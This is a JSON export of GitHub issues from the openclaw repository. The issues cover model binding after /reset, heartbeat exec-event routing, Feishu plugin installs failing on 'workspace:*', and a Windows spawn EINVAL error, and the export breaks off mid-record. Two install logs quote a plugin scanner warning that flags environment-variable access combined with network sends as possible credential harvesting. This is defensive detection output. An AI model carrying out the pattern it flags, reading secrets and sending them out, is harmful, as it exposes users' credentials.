{
  "repo": "openclaw/openclaw",
  "fetchedAt": "2026-02-11T17:22:47.345Z",
  "max": 500,
  "since": "2026-02-08T17:22:10.940Z",
  "issues": [
    {
      "number": 14199,
      "title": "Bug: /reset can start first reply on non-default model before default binding applies",
      "body": "## Summary\nAfter `/reset`, a new session may produce its first reply on a non-default runtime model (Codex), even though the configured `default_model` is Kimi.\n\n## Expected Behavior\nA reset session should start on the configured default model before any assistant reply is generated.\n\n## Actual Behavior\nImmediately after reset, the assistant reply reported it was running on Codex and not Kimi. A manual model switch was required to force the session to Kimi.\n\n## Environment\n- OpenClaw version: `2026.2.9 (33c75cb)`\n- Agent: `pm`\n- Channel: Discord\n- Session type: reset/new session flow\n- Timezone: America/Toronto\n\n## Reproduction Steps\n1. Configure `default_model` to Kimi (`kimi-coding/k2p5`).\n2. Trigger `/reset` in an active Discord session.\n3. Prompt assistant to greet and mention runtime/default model.\n4. Observe first reply says runtime model is Codex, not default Kimi.\n5. Run explicit model override to Kimi.\n6. Verify subsequent status shows Kimi default correctly bound.\n\n## Evidence / Observations\n- User observed mismatch immediately post-reset.\n- Assistant acknowledged initial Codex runtime, then successfully switched to Kimi.\n- `session_status` after explicit switch showed model as `kimi-coding/k2p5 (default)`.\n\n## Impact\n- Confusing trust signal for model routing correctness.\n- Makes reset semantics appear unreliable.\n- Could affect cost/perf expectations if first turns run on unintended model.\n\n## Suggested Fix Direction\n- Ensure reset session binds to `default_model` before first generated token/reply.\n- If model resolution is async, block first response until binding confirmation.\n- Add telemetry/log marker for “model at first turn vs configured default_model”.\n\n## Acceptance Criteria\n- After `/reset`, first assistant response always uses configured default model.\n- No transient first-turn mismatch between runtime model and default model.\n- Regression test for reset/new-session model binding.\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14199",
      "createdAt": "2026-02-11T17:21:04Z",
      "updatedAt": "2026-02-11T17:21:04Z",
      "author": "tom-bot-for-rana[bot]",
      "labels": [],
      "taxonomy": {
        "channels": [
          "discord",
          "signal"
        ],
        "platforms": [],
        "components": [
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13448,
      "title": "[Bug]:feishu plugin install issue",
      "body": "## Summary\n\nWhat went wrong?\n◇  Install Feishu plugin?\n│  Download from npm (@openclaw/feishu)\nDownloading @openclaw/feishu…\nExtracting /tmp/openclaw-npm-pack-rJZkQK/openclaw-feishu-2026.2.9.tgz…\nWARNING: Plugin \"feishu\" contains dangerous code patterns: Environment variable access combined with network send — possible credential harvesting (/tmp/openclaw-plugin-bhHUe5/extract/package/src/media.ts:488)\nInstalling to /home/orangepi/.openclaw/extensions/feishu…\nInstalling plugin dependencies…\n│\n◇  Plugin install ──────────────────────────────────────────╮\n│                                                           │\n│  Failed to install @openclaw/feishu: npm install failed:  │\n│                                                           │\n├───────────────────────────────────────────────────────────╯\nPlugin install failed: npm install failed: \n\n\n",
      "state": "open",
      "comments": 15,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13448",
      "createdAt": "2026-02-10T14:47:22Z",
      "updatedAt": "2026-02-11T17:09:06Z",
      "author": "im2058",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": []
      },
      "commentsData": [
        {
          "id": 3878146812,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13448#issuecomment-3878146812",
          "createdAt": "2026-02-10T14:48:15Z",
          "updatedAt": "2026-02-10T14:48:15Z",
          "author": "Soulter",
          "body": "same here\n"
        },
        {
          "id": 3879511046,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13448#issuecomment-3879511046",
          "createdAt": "2026-02-10T17:13:38Z",
          "updatedAt": "2026-02-10T17:13:38Z",
          "author": "edisonan",
          "body": "same here\n"
        },
        {
          "id": 3881668899,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13448#issuecomment-3881668899",
          "createdAt": "2026-02-11T01:47:56Z",
          "updatedAt": "2026-02-11T01:47:56Z",
          "author": "lpdswing",
          "body": "same issue"
        },
        {
          "id": 3881687025,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13448#issuecomment-3881687025",
          "createdAt": "2026-02-11T01:55:45Z",
          "updatedAt": "2026-02-11T01:55:45Z",
          "author": "BravoureLee",
          "body": "same issue"
        },
        {
          "id": 3881849408,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13448#issuecomment-3881849408",
          "createdAt": "2026-02-11T02:58:34Z",
          "updatedAt": "2026-02-11T02:58:34Z",
          "author": "davidlight0510",
          "body": "same bug"
        },
        {
          "id": 3881855065,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13448#issuecomment-3881855065",
          "createdAt": "2026-02-11T03:00:56Z",
          "updatedAt": "2026-02-11T03:00:56Z",
          "author": "dsjerry",
          "body": "running successful by copying from git repo\n\n`openclaw plugins install ./extensions/feishu`"
        },
        {
          "id": 3882489113,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13448#issuecomment-3882489113",
          "createdAt": "2026-02-11T06:17:45Z",
          "updatedAt": "2026-02-11T06:17:45Z",
          "author": "Cyfarw9dd",
          "body": "same here, both try installing by @openclaw/feishu or git repo"
        },
        {
          "id": 3882566458,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13448#issuecomment-3882566458",
          "createdAt": "2026-02-11T06:28:02Z",
          "updatedAt": "2026-02-11T06:28:02Z",
          "author": "dsjerry",
          "body": "我也是遇到这个问题，但实际上已经可用了。\n按照[文档](https://docs.openclaw.ai/channels/feishu#feishu)走已经接入了飞书，试了下机器人没问题，不知道其他功能有没有影响"
        },
        {
          "id": 3882596564,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13448#issuecomment-3882596564",
          "createdAt": "2026-02-11T06:33:10Z",
          "updatedAt": "2026-02-11T06:33:10Z",
          "author": "Cyfarw9dd",
          "body": "> 我也是遇到这个问题，但实际上已经可用了。 按照[文档](https://docs.openclaw.ai/channels/feishu#feishu)走已经接入了飞书，试了下机器人没问题，不知道其他功能有没有影响\n\n你是指飞书插件安装时遇到了npm安装依赖报错，但是并不影响插件使用吗，终端执行openclaw gateway status是否会报feishu相关的warning\n"
        },
        {
          "id": 3882634727,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13448#issuecomment-3882634727",
          "createdAt": "2026-02-11T06:41:59Z",
          "updatedAt": "2026-02-11T06:41:59Z",
          "author": "dsjerry",
          "body": "> > 我也是遇到这个问题，但实际上已经可用了。 按照[文档](https://docs.openclaw.ai/channels/feishu#feishu)走已经接入了飞书，试了下机器人没问题，不知道其他功能有没有影响\n> \n> 你是指飞书插件安装时遇到了npm安装依赖报错，但是并不影响插件使用吗，终端执行openclaw gateway status是否会报feishu相关的warning\n\n会收到重复插件的警告：`Config warnings:\\n- plugins.entries.feishu: plugin feishu: duplicate plugin id detected; later plugin may be overridden`\n\n位置分别为：\n\n- 用户目录： ~\\.openclaw\\extensions\\feishu\\index.ts\n- node目录： nvm\\v24.6.0\\node_modules\\openclaw\\extensions\\feishu\\index.ts"
        },
        {
          "id": 3882635191,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13448#issuecomment-3882635191",
          "createdAt": "2026-02-11T06:42:05Z",
          "updatedAt": "2026-02-11T06:42:05Z",
          "author": "zhouqiaoli3",
          "body": "我是之前安装的时候正常接入，然后卸载，安装新的版本，就一直卡在这个地方，飞书设置不了\n\n"
        },
        {
          "id": 3882663136,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13448#issuecomment-3882663136",
          "createdAt": "2026-02-11T06:47:58Z",
          "updatedAt": "2026-02-11T06:47:58Z",
          "author": "Cyfarw9dd",
          "body": "> > > 我也是遇到这个问题，但实际上已经可用了。 按照[文档](https://docs.openclaw.ai/channels/feishu#feishu)走已经接入了飞书，试了下机器人没问题，不知道其他功能有没有影响\n> > \n> > \n> > 你是指飞书插件安装时遇到了npm安装依赖报错，但是并不影响插件使用吗，终端执行openclaw gateway status是否会报feishu相关的warning\n> \n> 会收到重复插件的警告：`Config warnings:\\n- plugins.entries.feishu: plugin feishu: duplicate plugin id detected; later plugin may be overridden`\n> \n> 位置分别为：\n> \n> * 用户目录： ~.openclaw\\extensions\\feishu\\index.ts\n> * node目录： nvm\\v24.6.0\\node_modules\\openclaw\\extensions\\feishu\\index.ts\n\n一样，我也是有这个warning，根据其他issue，好像其他插件也有这个问题"
        },
        {
          "id": 3883037955,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13448#issuecomment-3883037955",
          "createdAt": "2026-02-11T08:36:55Z",
          "updatedAt": "2026-02-11T08:40:02Z",
          "author": "yunqilee69",
          "body": "我也是，安装报错，我还以为是我的问题呢\n环境：debian13\nnode版本：nodejs\n复现步骤：openclaw plugins install @openclaw/feishu   （从源码安装也不行）\n具体的报错信息如下：\nxxx@debian:~$ cat ~/.npm/_logs/2026-02-11T08_33_51_157Z-debug-0.log \n0 verbose cli /home/xxx/.nvm/versions/node/v22.22.0/bin/node /home/xxx/.nvm/versions/node/v22.22.0/bin/npm\n1 info using npm@10.9.4\n2 info using node@v22.22.0\n3 silly config load:file:/home/xxx/.nvm/versions/node/v22.22.0/lib/node_modules/npm/npmrc\n4 silly config load:file:/home/xxx/.openclaw/extensions/feishu/.npmrc\n5 silly config load:file:/home/xxx/.npmrc\n6 silly config load:file:/home/xxx/.nvm/versions/node/v22.22.0/etc/npmrc\n7 verbose title npm install\n8 verbose argv \"install\" \"--omit\" \"dev\" \"--loglevel\" \"silent\"\n9 verbose logfile logs-max:10 dir:/home/xxx/.npm/_logs/2026-02-11T08_33_51_157Z-\n10 verbose logfile /home/xxx/.npm/_logs/2026-02-11T08_33_51_157Z-debug-0.log\n11 silly logfile start cleaning logs, removing 1 files\n12 silly logfile done cleaning log files\n13 silly packumentCache heap:4345298944 maxSize:1086324736 maxEntrySize:543162368\n14 silly idealTree buildDeps\n15 silly fetch manifest @larksuiteoapi/node-sdk@^1.58.0\n16 silly packumentCache full:https://registry.npmjs.org/@larksuiteoapi%2fnode-sdk cache-miss\n17 http cache https://registry.npmjs.org/@larksuiteoapi%2fnode-sdk 11ms (cache hit)\n18 silly packumentCache full:https://registry.npmjs.org/@larksuiteoapi%2fnode-sdk set size:315600 disposed:false\n19 silly fetch manifest @sinclair/typebox@0.34.48\n20 silly packumentCache full:https://registry.npmjs.org/@sinclair%2ftypebox cache-miss\n21 http cache https://registry.npmjs.org/@sinclair%2ftypebox 6ms (cache hit)\n22 silly packumentCache full:https://registry.npmjs.org/@sinclair%2ftypebox set size:1145528 disposed:false\n23 silly fetch manifest zod@^4.3.6\n24 silly packumentCache full:https://registry.npmjs.org/zod cache-miss\n25 http cache https://registry.npmjs.org/zod 10ms (cache hit)\n26 silly packumentCache full:https://registry.npmjs.org/zod set size:3489329 disposed:false\n27 verbose stack Error: Unsupported URL Type \"workspace:\": workspace:*\n27 verbose stack     at unsupportedURLType (/home/xxx/.nvm/versions/node/v22.22.0/lib/node_modules/npm/node_modules/npm-package-arg/lib/npa.js:369:15)\n27 verbose stack     at fromURL (/home/xxx/.nvm/versions/node/v22.22.0/lib/node_modules/npm/node_modules/npm-package-arg/lib/npa.js:428:13)\n27 verbose stack     at Function.resolve (/home/xxx/.nvm/versions/node/v22.22.0/lib/node_modules/npm/node_modules/npm-package-arg/lib/npa.js:110:12)\n27 verbose stack     at #nodeFromEdge (/home/xxx/.nvm/versions/node/v22.22.0/lib/node_modules/npm/node_modules/@npmcli/arborist/lib/arborist/build-ideal-tree.js:1039:22)\n27 verbose stack     at #buildDepStep (/home/xxx/.nvm/versions/node/v22.22.0/lib/node_modules/npm/node_modules/@npmcli/arborist/lib/arborist/build-ideal-tree.js:904:35)\n27 verbose stack     at async Arborist.buildIdealTree (/home/xxx/.nvm/versions/node/v22.22.0/lib/node_modules/npm/node_modules/@npmcli/arborist/lib/arborist/build-ideal-tree.js:181:7)\n27 verbose stack     at async Promise.all (index 1)\n27 verbose stack     at async Arborist.reify (/home/xxx/.nvm/versions/node/v22.22.0/lib/node_modules/npm/node_modules/@npmcli/arborist/lib/arborist/reify.js:131:5)\n27 verbose stack     at async Install.exec (/home/xxx/.nvm/versions/node/v22.22.0/lib/node_modules/npm/lib/commands/install.js:150:5)\n27 verbose stack     at async Npm.exec (/home/xxx/.nvm/versions/node/v22.22.0/lib/node_modules/npm/lib/npm.js:207:9)\n28 error code EUNSUPPORTEDPROTOCOL\n29 error Unsupported URL Type \"workspace:\": workspace:*\n30 silly unfinished npm timer reify 1770798831348\n31 silly unfinished npm timer reify:loadTrees 1770798831348\n32 silly unfinished npm timer idealTree:buildDeps 1770798831358\n33 silly unfinished npm timer idealTree:#root 1770798831359\n34 verbose cwd /home/xxx/.openclaw/extensions/feishu\n35 verbose os Linux 6.12.43+deb13-amd64\n36 verbose node v22.22.0\n37 verbose npm  v10.9.4\n38 verbose exit 1\n39 verbose code 1\n40 error A complete log of this run can be found in: /home/xxx/.npm/_logs/2026-02-11T08_33_51_157Z-debug-0.log\n"
        },
        {
          "id": 3885069036,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13448#issuecomment-3885069036",
          "createdAt": "2026-02-11T15:10:18Z",
          "updatedAt": "2026-02-11T15:10:18Z",
          "author": "Yukinekoko",
          "body": "In `extensions/feishu/package.json`, update the following:\n\n```json\n\"devDependencies\": {\n  \"openclaw\": \"workspace:*\"\n}\n```\n\nChange it to:\n\n```json\n\"devDependencies\": {\n  \"openclaw\": \"../../\"\n}\n```\n\nAfter that, running:\n\n```\nopenclaw plugins install ./extensions/feishu\n```\n\nwill install the plugin successfully."
        },
        {
          "id": 3885775323,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13448#issuecomment-3885775323",
          "createdAt": "2026-02-11T17:09:06Z",
          "updatedAt": "2026-02-11T17:09:06Z",
          "author": "whickyzwj",
          "body": "same issue, please fix it quickly"
        }
      ]
    },
    {
      "number": 14191,
      "title": "Heartbeat checks wrong session queue for exec completion events",
      "body": "## Bug description\n\nWhen an exec completes on a channel-specific session (e.g., a Discord channel or WhatsApp peer), the heartbeat fires but fails to detect the pending exec event. The heartbeat always returns `HEARTBEAT_OK` instead of relaying the exec result via `EXEC_EVENT_PROMPT`.\n\nThe root cause is a **session key mismatch**: exec events are enqueued under the **peer-specific session key** (e.g., `agent:main:discord:channel:<channelId>`), but the heartbeat runner always checks the **main session key** (`agent:main:main`).\n\n## Steps to reproduce\n\n1. Configure heartbeat with any target (e.g., `target: \"last\"`)\n2. Send a message from Discord (or any channel) that triggers an exec\n3. Approve the exec\n4. Exec completes — `requestHeartbeatNow({ reason: \"exec-event\" })` fires\n5. Heartbeat runs and responds with `HEARTBEAT_OK` instead of relaying the exec result\n6. The exec result is never delivered until the user sends another message in that channel session\n\n## Root cause\n\nThe system event queue (`src/infra/system-events.ts`) is a `Map<string, SessionQueue>` keyed by session key. Events are strictly isolated per key.\n\n**Enqueue path** (`src/gateway/server-node-events.ts`):\n\n```typescript\n// exec.finished handler\nconst sessionKey = typeof obj.sessionKey === \"string\"\n  ? obj.sessionKey.trim()\n  : `node-${nodeId}`;\n// ...\nenqueueSystemEvent(text, { sessionKey, contextKey: ... });\nrequestHeartbeatNow({ reason: \"exec-event\" });\n```\n\nThe `sessionKey` comes from the node event payload — the peer-specific session key set during original message processing (e.g., `agent:main:discord:channel:1469129735933132962`).\n\n**Heartbeat check path** (`src/infra/heartbeat-runner.ts`):\n\n```typescript\nconst { entry, sessionKey, storePath } = resolveHeartbeatSession(cfg, agentId, heartbeat);\n// ...\nconst pendingEvents = isExecEvent || isCronEvent\n  ? peekSystemEvents(sessionKey)  // <-- uses heartbeat's main session key\n  : [];\n```\n\n`resolveHeartbeatSession()` always returns the main session key (`agent:main:main`) unless `heartbeat.session` is explicitly configured.\n\n**Result:** `peekSystemEvents(\"agent:main:main\")` finds nothing because the events live under `\"agent:main:discord:channel:...\"`. `hasExecCompletion` is false, and the standard heartbeat prompt is used.\n\n**The wake handler** (`src/infra/heartbeat-wake.ts`) only passes `reason` — no session key context:\n\n```typescript\nexport function requestHeartbeatNow(opts?: { reason?: string; coalesceMs?: number }) {\n  pendingReason = opts?.reason ?? pendingReason ?? \"requested\";\n  schedule(opts?.coalesceMs ?? DEFAULT_COALESCE_MS);\n}\n```\n\nThe originating session key is lost at this point.\n\n## Relationship to #7065\n\nThis is separate from #7065, which was about the reason check being too strict (`reason === \"exec-event\"` only). PR #11641 fixed #7065 by expanding which reasons trigger the event check. But even with the correct reason, `peekSystemEvents()` looks in the wrong queue — the session key mismatch is orthogonal to the reason filtering.\n\n## Suggested fix\n\nThe core problem is that `requestHeartbeatNow()` discards the originating session key. One approach:\n\n1. Extend `requestHeartbeatNow()` to accept an optional `sessionKey` parameter\n2. Pass the `sessionKey` from `server-node-events.ts` through the wake handler to `runHeartbeatOnce()`\n3. In `runHeartbeatOnce()`, use the originating session key (when provided) for `peekSystemEvents()` instead of the resolved heartbeat session key\n\nAlternatively, `peekSystemEvents()` could scan all session queues (the `queues` Map), but that seems less targeted.\n\n## Agent prompt\n\nWhen an exec completes on a channel-specific session (Discord, WhatsApp, Slack, etc.), the heartbeat fires with `reason: \"exec-event\"` but then checks `peekSystemEvents()` on the main session key (`resolveHeartbeatSession()`) instead of the session where the exec event was actually enqueued. This means exec results are never relayed by the heartbeat — it always falls through to `HEARTBEAT_OK`. The originating session key from the exec event needs to be propagated through `requestHeartbeatNow()` in `src/infra/heartbeat-wake.ts` so the heartbeat runner in `src/infra/heartbeat-runner.ts` can peek the correct session queue. Key files: `server-node-events.ts` (enqueue side), `heartbeat-wake.ts` (wake handler that loses the key), `heartbeat-runner.ts` (peek side), `system-events.ts` (the per-session queue Map).\n\n## Environment\n\n- OpenClaw 2026.2.6 (git HEAD includes PR #11641 fix for #7065)\n- Heartbeat config: `target: \"last\"`, model: `google/gemini-2.5-flash`\n- Channel: Discord (guild messages)\n- Session scope: `per-sender` (default)",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14191",
      "createdAt": "2026-02-11T17:08:13Z",
      "updatedAt": "2026-02-11T17:08:13Z",
      "author": "LucasAIBuilder",
      "labels": [],
      "taxonomy": {
        "channels": [
          "whatsapp",
          "discord",
          "slack"
        ],
        "platforms": [],
        "components": [
          "gateway",
          "config"
        ]
      }
    },
    {
      "number": 14042,
      "title": "[Bug]: openclaw channels add` fails for Feishu plugin — `workspace:*` in devDependencies breaks `npm install --omit=dev",
      "body": "## Summary\n\n`openclaw channels add` fails to install the Feishu plugin (`@openclaw/feishu@2026.2.9`). The npm tarball ships with `\"openclaw\": \"workspace:*\"` in `devDependencies`, which causes `npm install --omit=dev` to abort with `EUNSUPPORTEDPROTOCOL` before installing **any** dependencies — including production deps like `@sinclair/typebox`, `@larksuiteoapi/node-sdk`, and `zod`.\n\n## Steps to reproduce\n\n1. `npm install -g openclaw@2026.2.9` (fresh install)\n2. `openclaw channels add` → select **Feishu/Lark (飞书)** → choose **Download from npm (@openclaw/feishu)**\n3. Plugin download and extraction succeed, but dependency installation fails\n4. `openclaw doctor` reports the local plugin as broken\n\n## Expected behavior\n\nThe Feishu plugin should be installed successfully with all its production dependencies (`@sinclair/typebox`, `@larksuiteoapi/node-sdk`, `zod`) present in `~/.openclaw/extensions/feishu/node_modules/`. `openclaw doctor` should report `Errors: 0`.\n\n## Actual behavior\n\n`npm install --omit=dev` (called by `installPluginFromPackageDir()` in `src/plugins/install.ts`) fails because the extracted `package.json` contains:\n\n```json\n\"devDependencies\": {\n    \"openclaw\": \"workspace:*\"\n}\n```\n\nnpm rejects the `workspace:` protocol during resolution — **before** it even gets to installing anything:\n\n```\nnpm error code EUNSUPPORTEDPROTOCOL\nnpm error Unsupported URL Type \"workspace:\": workspace:*\n```\n\nThis aborts the entire install. No `node_modules` directory is created. `openclaw doctor` then reports:\n\n```\n~/.openclaw/extensions/feishu/index.ts:\nError: Cannot find module '@sinclair/typebox'\nRequire stack:\n  - ~/.openclaw/extensions/feishu/src/bitable.ts\n```\n\n### Why `workspace:*` wasn't replaced\n\nThe install flow (`installPluginFromNpmSpec()`) uses **`npm pack`** to download the tarball. `npm pack` does **not** rewrite `workspace:*` — only `pnpm pack`/`pnpm publish` does that automatically. So `workspace:*` arrives on the user's machine as-is.\n\n`AGENTS.md` already notes: *\"Avoid `workspace:*` in `dependencies` (npm install breaks)\"*, but npm also fails when `workspace:*` is in `devDependencies` — `--omit=dev` skips **installing** devDeps, but npm still **validates** all specifiers during resolution.\n\n### Why the bundled (global) plugin works fine\n\nThe global plugin at `/opt/homebrew/lib/node_modules/openclaw/extensions/feishu/` has no `node_modules` either, but its dependencies (`@sinclair/typebox` etc.) are hoisted into the parent `openclaw/node_modules/`. Node's module resolution walks up the directory tree and finds them. The local plugin at `~/.openclaw/extensions/feishu/` has no such parent `node_modules`.\n\n## Environment\n\n- OpenClaw version: 2026.2.9\n- OS: macOS 15 (Apple Silicon)\n- Install method: `npm install -g openclaw@latest`\n- Node: v22.x\n- npm: 10.x\n- pnpm: 10.29.2\n\n## Logs or screenshots\n\n<details>\n<summary>Full output from <code>openclaw channels add</code></summary>\n\n```\n◇ Select a channel\n│ Feishu/Lark (飞书)\n│\n◇ Install Feishu plugin?\n│ Download from npm (@openclaw/feishu)\nDownloading @openclaw/feishu…\nExtracting /var/folders/39/.../openclaw-feishu-2026.2.9.tgz…\nWARNING: Plugin \"feishu\" contains dangerous code patterns:\n  Environment variable access combined with network send — possible credential harvesting\n  (/var/folders/39/.../extract/package/src/media.ts:488)\nInstalling to /Users/jiangjianhai/.openclaw/extensions/feishu…\nInstalling plugin dependencies…\n│\n◇ Plugin install ──────────────────────────────────────────╮\n│                                                          │\n│ Failed to install @openclaw/feishu: npm install failed:  │\n│                                                          │\n├──────────────────────────────────────────────────────────╯\nPlugin install failed: npm install failed:\n```\n\n</details>\n\n<details>\n<summary>Reproducing <code>npm install</code> manually in the plugin directory</summary>\n\n```\n$ cd ~/.openclaw/extensions/feishu\n$ npm install --omit=dev\nnpm error code EUNSUPPORTEDPROTOCOL\nnpm error Unsupported URL Type \"workspace:\": workspace:*\n```\n\n</details>\n\n<details>\n<summary>The problematic <code>package.json</code> (from the npm tarball)</summary>\n\n```json\n{\n  \"name\": \"@openclaw/feishu\",\n  \"version\": \"2026.2.9\",\n  \"dependencies\": {\n    \"@larksuiteoapi/node-sdk\": \"^1.58.0\",\n    \"@sinclair/typebox\": \"0.34.48\",\n    \"zod\": \"^4.3.6\"\n  },\n  \"devDependencies\": {\n    \"openclaw\": \"workspace:*\"\n  }\n}\n```\n\n</details>\n\n## Workaround\n\n```bash\ncd ~/.openclaw/extensions/feishu\nsed -i '' 's/\"openclaw\": \"workspace:\\*\"/\"openclaw\": \"*\"/' package.json\npnpm install --prod\n```\n\nOr simply remove the local plugin and rely on the bundled global one:\n\n```bash\nrm -rf ~/.openclaw/extensions/feishu\n```\n\n## Suggested fix\n\nThe simplest fix: in `installPluginFromPackageDir()` (`src/plugins/install.ts`), sanitize `workspace:` protocol entries in `package.json` before running `npm install`:\n\n```ts\n// Before running npm install, rewrite workspace: protocol refs to avoid EUNSUPPORTEDPROTOCOL\nfor (const depGroup of ['dependencies', 'devDependencies', 'peerDependencies'] as const) {\n    const deps = manifest[depGroup];\n    if (!deps) continue;\n    for (const [key, value] of Object.entries(deps)) {\n        if (typeof value === 'string' && value.startsWith('workspace:')) {\n            deps[key] = '*';\n        }\n    }\n}\n```\n\nAlternatively, use `pnpm pack` instead of `npm pack` in the download flow so `workspace:*` gets rewritten at pack time.\n\n## Related\n\n- Commit `chore: project hygiene — fix workspace:*, sandbox USER, dead config` (3 days ago) — partial awareness, but the fix hasn't reached the npm-published tarball yet.\n- This likely affects **all** `@openclaw/*` plugins distributed via npm that ship `workspace:*` in devDependencies.\n\n",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14042",
      "createdAt": "2026-02-11T10:59:21Z",
      "updatedAt": "2026-02-11T17:07:58Z",
      "author": "Enthusiasm-Dylan",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3885768142,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/14042#issuecomment-3885768142",
          "createdAt": "2026-02-11T17:07:58Z",
          "updatedAt": "2026-02-11T17:07:58Z",
          "author": "lisi815",
          "body": "Waiting for repair。Is there any third-party plugin that can replace it?"
        }
      ]
    },
    {
      "number": 7631,
      "title": "Windows: openclaw plugins install fails with spawn EINVAL",
      "body": "## Summary\n\nOn Windows, `openclaw plugins install` fails with `Error: spawn EINVAL` when installing plugins from npm.\nThe failure happens during the plugin installation step where OpenClaw spawns `npm` (or `npm.cmd`) as a child process.\n\nThis appears to be a Windows-specific issue related to how `child_process.spawn` is used for `.cmd` executables.\n\n---\n\n## Steps to reproduce\n\n1. Use Windows 10/11.\n2. Install Node.js **v22.x LTS**.\n3. Install OpenClaw globally:\n\n   ```bash\n   npm install -g openclaw\n   ```\n4. Run the following command in a normal working directory (not `System32`):\n\n   ```bash\n   openclaw plugins install @m1heng-clawd/feishu\n   ```\n\n---\n\n## Expected behavior\n\nThe plugin should be downloaded and installed successfully via npm, and then appear in:\n\n```bash\nopenclaw plugins list\n```\n\n---\n\n## Actual behavior\n\nThe command fails immediately with the following error:\n\n```text\nDownloading @m1heng-clawd/feishu…\n[openclaw] Failed to start CLI: Error: spawn EINVAL\n    at ChildProcess.spawn (node:internal/child_process:420:11)\n    at spawn (node:child_process:787:9)\n    at runCommandWithTimeout (.../openclaw/dist/process/exec.js:83:19)\n    at installPluginFromNpmSpec (.../openclaw/dist/plugins/install.js:306:23)\n```\n\nThe error occurs before npm actually runs.\n\n---\n\n## Environment\n\n* Clawdbot version: `OpenClaw 2026.2.1`\n* OS: Windows 11 x64\n* Install method (pnpm/npx/docker/etc): `npm install -g openclaw`\n* Node.js version: `v22.22.0 LTS`\n\n---\n\n## Logs or screenshots\n\nRelevant stack trace:\n\n```text\nError: spawn EINVAL\n    at ChildProcess.spawn (node:internal/child_process:420:11)\n    at spawn (node:child_process:787:9)\n    at runCommandWithTimeout (openclaw/dist/process/exec.js:83:19)\n```\n\n### Additional technical notes\n\nFrom inspecting `dist/process/exec.js`, OpenClaw currently spawns npm like this on Windows:\n\n```js\nspawn(\"npm.cmd\", args, {\n  stdio,\n  cwd,\n  env,\n});\n```\n\nOn Windows, spawning `.cmd` files with `shell: false` can cause `EINVAL`.\nA possible fix would be to enable `shell: true` on Windows only, for example:\n\n```js\nconst isWindows = process.platform === \"win32\";\n\nspawn(command, args, {\n  stdio,\n  cwd,\n  env,\n  shell: isWindows,\n});\n```\n\nThis approach is commonly used by other cross-platform CLIs to ensure compatibility with Windows command wrappers.\n",
      "state": "open",
      "comments": 6,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/7631",
      "createdAt": "2026-02-03T02:17:29Z",
      "updatedAt": "2026-02-11T17:04:20Z",
      "author": "kuman62",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "windows",
          "docker"
        ],
        "components": [
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3838538686,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7631#issuecomment-3838538686",
          "createdAt": "2026-02-03T02:19:58Z",
          "updatedAt": "2026-02-03T02:19:58Z",
          "author": "kuman62",
          "body": "### Suggested fix (code example)\n\nThe issue seems to be caused by spawning `.cmd` executables on Windows without enabling `shell` mode.\n\n**Current implementation (problematic on Windows):**\n\n```js\nconst child = spawn(resolveCommand(argv[0]), argv.slice(1), {\n  stdio,\n  cwd,\n  env: resolvedEnv,\n  windowsVerbatimArguments,\n});\n```\n\nOn Windows, `resolveCommand(argv[0])` may resolve to `npm.cmd`.\nSpawning `.cmd` files with `shell: false` can result in `spawn EINVAL`.\n\n---\n\n**Proposed change (Windows-compatible):**\n\n```js\nconst isWindows = process.platform === \"win32\";\n\nconst child = spawn(resolveCommand(argv[0]), argv.slice(1), {\n  stdio,\n  cwd,\n  env: resolvedEnv,\n  shell: isWindows,\n  windowsVerbatimArguments: isWindows ? false : windowsVerbatimArguments,\n});\n```\n\nThis ensures that on Windows, `.cmd` commands (such as `npm.cmd`, `pnpm.cmd`) are executed via the system shell, while keeping the existing behavior unchanged on macOS and Linux.\n\n---\n\n### Rationale\n\n* Windows command-line tools like `npm`, `pnpm`, and `yarn` are implemented as `.cmd` wrappers.\n* Node.js `child_process.spawn` requires `shell: true` to reliably execute `.cmd` files.\n* This pattern is widely used by other cross-platform CLIs (e.g. execa, zx, cross-env).\n* The change is minimal, Windows-only, and does not affect POSIX platforms.\n\n"
        },
        {
          "id": 3843276092,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7631#issuecomment-3843276092",
          "createdAt": "2026-02-03T19:39:20Z",
          "updatedAt": "2026-02-03T19:39:20Z",
          "author": "ZhuoQian111",
          "body": "same issue when I install bird skill at web dashboard, I use node v24.9.0 and npm v11.6.0 "
        },
        {
          "id": 3847516076,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7631#issuecomment-3847516076",
          "createdAt": "2026-02-04T13:38:22Z",
          "updatedAt": "2026-02-04T13:38:22Z",
          "author": "HeyCrab3",
          "body": "I met the same problem too #8836 "
        },
        {
          "id": 3864590738,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7631#issuecomment-3864590738",
          "createdAt": "2026-02-07T14:22:37Z",
          "updatedAt": "2026-02-07T14:22:37Z",
          "author": "Ziphyrien",
          "body": "@steipete "
        },
        {
          "id": 3866569164,
